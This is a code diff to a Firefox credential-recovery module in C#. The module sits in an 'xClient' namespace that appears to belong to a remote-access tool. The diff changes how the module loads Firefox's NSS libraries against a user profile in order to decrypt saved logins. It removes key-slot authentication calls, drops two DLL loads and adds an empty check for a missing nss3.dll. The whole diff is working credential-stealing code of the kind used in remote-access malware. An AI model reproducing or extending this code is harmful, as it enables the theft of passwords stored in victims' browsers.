@@ -142,15 +142,21 @@ namespace xClient.Core.Recovery.Browsers
         #region Functions
         private static void InitializeDelegates(DirectoryInfo firefoxProfilePath, DirectoryInfo firefoxPath)
         {
-            LoadLibrary(firefoxPath.FullName + "\\msvcp120.dll");
-            LoadLibrary(firefoxPath.FullName + "\\msvcr120.dll");
             LoadLibrary(firefoxPath.FullName + "\\mozglue.dll");
             nssModule = LoadLibrary(firefoxPath.FullName + "\\nss3.dll");
+
+            if (nssModule == IntPtr.Zero)
+            {
+                /*
+                 * This means Firefox was either:
+                 *  A) Not found [installed in other dir perhaps?]
+                 *  B) Not installed period
+                 */
+            }
+
             IntPtr pProc = GetProcAddress(nssModule, "NSS_Init");
             NSS_InitPtr NSS_Init = (NSS_InitPtr)Marshal.GetDelegateForFunctionPointer(pProc, typeof(NSS_InitPtr));
             NSS_Init(firefoxProfilePath.FullName);
-            long keySlot = PK11_GetInternalKeySlot();
-            PK11_Authenticate(keySlot, true, 0);
         }
         private static DateTime FromUnixTime(long unixTime)
         {
@@ -266,12 +272,6 @@ namespace xClient.Core.Recovery.Browsers
         private delegate int PK11SDR_DecryptPtr(ref TSECItem data, ref TSECItem result, int cx);
 
         [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
-        private delegate long PK11_GetInternalKeySlotPtr();
-
-        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
-        private delegate long PK11_AuthenticatePtr(long slot, bool loadCerts, long wincx);
-
-        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
         private delegate int NSSBase64_DecodeBufferPtr(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen);
 
         [StructLayout(LayoutKind.Sequential)]
@@ -344,18 +344,6 @@ namespace xClient.Core.Recovery.Browsers
 
         #region Delegate Handling
         // Credit: http://www.codeforge.com/article/249225
-        private static long PK11_GetInternalKeySlot()
-        {
-            IntPtr pProc = GetProcAddress(nssModule, "PK11_GetInternalKeySlot");
-            PK11_GetInternalKeySlotPtr ptr = (PK11_GetInternalKeySlotPtr)Marshal.GetDelegateForFunctionPointer(pProc, typeof(PK11_GetInternalKeySlotPtr));
-            return ptr();
-        }
-        private static long PK11_Authenticate(long slot, bool loadCerts, long wincx)
-        {
-            IntPtr pProc = GetProcAddress(nssModule, "PK11_Authenticate");
-            PK11_AuthenticatePtr ptr = (PK11_AuthenticatePtr)Marshal.GetDelegateForFunctionPointer(pProc, typeof(PK11_AuthenticatePtr));
-            return ptr(slot, loadCerts, wincx);
-        }
         private static int NSSBase64_DecodeBuffer(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen)
         {
             IntPtr pProc = GetProcAddress(nssModule, "NSSBase64_DecodeBuffer");
